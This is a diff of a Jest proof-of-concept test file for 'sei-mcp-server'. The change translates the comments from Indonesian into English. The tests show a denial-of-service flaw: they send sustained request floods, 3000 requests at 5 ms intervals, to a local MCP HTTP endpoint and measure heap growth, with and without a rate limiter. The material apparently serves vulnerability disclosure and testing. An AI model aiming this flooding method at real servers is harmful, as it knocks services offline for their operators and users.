@@ -1,7 +1,7 @@
 import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
 import express from 'express';
 
-// 1. Mock modul external agar tidak keluar jaringan
+// 1. Mock external modules to prevent outbound network requests
 jest.mock('../../mintlify/search.js', () => ({
     createSeiJSDocsSearchTool: jest.fn(async () => {})
 }));
@@ -10,7 +10,7 @@ jest.mock('../../docs/index.js', () => ({
     createDocsSearchTool: jest.fn(async () => {})
 }));
 
-// Mock package-info.ts untuk mencegah crash __filename di Jest ESM
+// Mock package-info.ts to prevent __filename crash in Jest ESM
 jest.mock('../../server/package-info.js', () => ({
     getPackageInfo: () => ({
         name: 'sei-mcp-server',
@@ -54,7 +54,7 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
         if (transport) await transport.stop();
     });
 
-    // TEST 1: Tanpa Rate Limiter (Bare-metal server)
+    // TEST 1: Without Rate Limiter (Bare-metal server)
     it('Test 1: should cause memory exhaustion on concurrent requests (No Limit)', async () => {
         transport = new StreamableHttpTransport(targetPort, 'localhost', '/mcp', 'disabled');
         await transport.start({} as any);
@@ -84,11 +84,11 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
         console.log(`[Test 1 - No Limit] Memory after: ${memAfter.toFixed(2)} MB`);
         console.log(`[Test 1 - No Limit] Memory increased by: ${(memAfter - memBefore).toFixed(2)} MB\n`);
 
-        // Pembengkakan memory membuktikan object McpServer dibuat berulang kali
+        // Memory bloat proves that the McpServer object is instantiated repeatedly
         expect(memAfter).toBeGreaterThan(memBefore);
     });
 
-    // TEST 2: Dengan Rate Limiter (Simulasi API Gateway 100 req/s)
+    // TEST 2: With Rate Limiter (Simulating API Gateway 100 req/s)
     it('Test 2: should still cause memory exhaustion even with a rate limiter (100 req/s)', async () => {
         const app = express();
         app.use(express.json());
@@ -116,9 +116,9 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
         const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
         console.log(`\n[Test 2 - With Rate Limit] Memory before: ${memBefore.toFixed(2)} MB`);
 
-        // Kirim 3000 request dengan delay 5ms (200 req/detik). 
-        // Rate limiter hanya mengizinkan 100 req/detik, tapi request yang LOLOS tetap memicu getServer()
-        // Serangan ini berlangsung selama 15 detik tanpa henti, sehingga GC tidak sempat membersihkan object berat.
+        // Send 3000 requests with a 5ms delay (200 req/sec). 
+        // Rate limiter only allows 100 req/sec, but the requests that PASS THROUGH still trigger getServer()
+        // This attack lasts for 15 seconds continuously, so the GC doesn't have time to clean up heavy objects.
         const attackCount = 3000; 
         for (let i = 0; i < attackCount; i++) {
             fetch(targetUrl, {
@@ -129,7 +129,7 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
             await new Promise(resolve => setTimeout(resolve, 5)); 
         }
 
-        // Beri jeda sangat singkat agar Promise selesai, tapi tidak cukup untuk GC membebaskan memory
+        // Give a very short delay for Promises to resolve, but not enough for GC to free memory
         await new Promise(resolve => setTimeout(resolve, 100));
 
         const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
@@ -138,7 +138,7 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
 
         server.close();
 
-        // Meskipun dirate-limit, serangan sustained tetap menyebabkan pembengkakan memory
+        // Even with rate limiting, a sustained attack still causes memory bloat
         expect(memAfter).toBeGreaterThan(memBefore);
     });
 });
